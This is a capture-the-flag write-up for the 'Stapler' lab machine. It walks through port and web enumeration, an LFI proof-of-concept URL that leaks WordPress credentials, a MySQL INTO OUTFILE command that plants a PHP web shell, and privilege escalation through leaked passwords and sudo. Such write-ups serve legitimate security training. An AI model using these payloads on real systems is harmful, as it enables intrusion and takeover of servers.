# Stapler: Machine Notes

## Recon

### Nmap
- Port 21/tcp: FTP (vsftpd 3.0.3, anonymous allowed)
- Port 22/tcp: SSH (OpenSSH 7.2p2)
- Port 139/tcp: SMB (Samba 4.3.9)
- Port 666/tcp: Zip file (contains `message2.jpg`)
- Port 3306/tcp: MySQL (5.7.12)
- Port 12380/tcp: HTTP/HTTPS (Apache 2.4.18)

### Web Enumerated (Port 12380)
- `robots.txt` reveals `/blogblog/` and `/admin112233/`.
- Site at `/blogblog/` is **WordPress 4.2.1**.
- Plugin directory listing enabled: `/wp-content/plugins/`.
- Found vulnerable plugin: **Advanced Video v1.0** (LFI).

### SMB Enumeration
- Anonymous access allowed to shares `kathy` and `tmp`.
- Found various notes and hashes in these shares.

## Initial Access

### WordPress LFI to MySQL Credentials
- Vulnerability in `advanced-video-embed` plugin allows reading files by creating a post with a file attachment.
- PoC for `wp-config.php`:
```http
https://192.168.172.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=leak&short=1&term=1&thumb=../wp-config.php
```
- Retrieved `wp-config.php` from `/wp-content/uploads/` (it converts text to JPEG but content is accessible).
- Credentials found: `root` : `plbkac`.

### RCE via MySQL
- Connected to MySQL remotely: `mysql -u root -pplbkac -h 192.168.172.148`.
- Discovered web root via LFI (reading `/etc/apache2/sites-available/default-ssl.conf` -> `/var/www/https`).
- Wrote a PHP shell using `INTO OUTFILE`:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";
```
- Gained shell as `www-data` via `curl`.

## Privilege Escalation

### Lateral Movement (www-data to peter)
- System misconfiguration: home directories are readable.
- Checked `/home/JKanode/.bash_history`:
```bash
sshpass -p JZQuyIN5 ssh peter@localhost
```
- Found credentials for `peter` : `JZQuyIN5`.

### Sudo Abuse (peter to root)
- `sudo -l` for `peter`:
```
(ALL : ALL) ALL
```
- Execute `sudo su`.
- Result: **Root shell**.
